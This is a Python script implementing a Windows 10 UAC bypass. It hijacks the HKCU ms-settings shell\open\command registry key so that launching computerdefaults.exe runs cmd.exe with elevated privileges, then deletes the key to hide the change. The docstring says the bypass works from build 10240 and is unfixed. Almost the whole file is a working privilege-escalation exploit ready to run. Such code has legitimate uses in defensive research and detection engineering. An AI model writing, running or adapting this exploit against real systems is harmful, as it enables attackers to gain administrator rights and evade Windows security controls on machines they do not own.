"""
Works from: Windows 10 TH1 (10240)
Fixed in: unfixed 
"""
import os
import wmi
import time
import _winreg
import win32con
from colorama import init, Fore
init(convert=True)

wmi = wmi.WMI()

payload = "c:\\windows\\system32\\cmd.exe"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def computerdefaults():
	print " {} computerdefaults: Attempting to create registry key".format(infoBox())
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Classes\ms-settings\shell\open\command"))
								
		_winreg.SetValueEx(key,
				None,
				0,
				_winreg.REG_SZ,
				payload)

		_winreg.SetValueEx(key,
				"DelegateExecute",
				0,
				_winreg.REG_SZ,
				None)

		_winreg.CloseKey(key)
		print " {} computerdefaults: Registry key created".format(successBox())
	except Exception as error:
		print " {} computerdefaults: Unable to create key".format(errorBox())
		return False

	print " {} computerdefaults: Pausing for 5 seconds before executing".format(infoBox())	
	time.sleep(5)
		
	print " {} computerdefaults: Attempting to create process".format(infoBox())
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start computerdefaults.exe",
						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
		if (result[1] == 0):
			print " {} computerdefaults: Process started successfully".format(successBox())
		else:
			print " {} computerdefaults: Problem creating process".format(errorBox())
	except Exception as error:
		print " {} computerdefaults: Problem creating process".format(errorBox())
		return False

	print " {} computerdefaults: Pausing for 5 seconds before cleaning".format(infoBox())	
	time.sleep(5)

	print " {} computerdefaults: Attempting to remove registry key".format(infoBox())
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Classes\ms-settings\shell\open\command"))
		print " {} computerdefaults: Registry key was deleted".format(successBox())
	except Exception as error:
		print " {} computerdefaults: Unable to delete key".format(errorBox())
		return False	
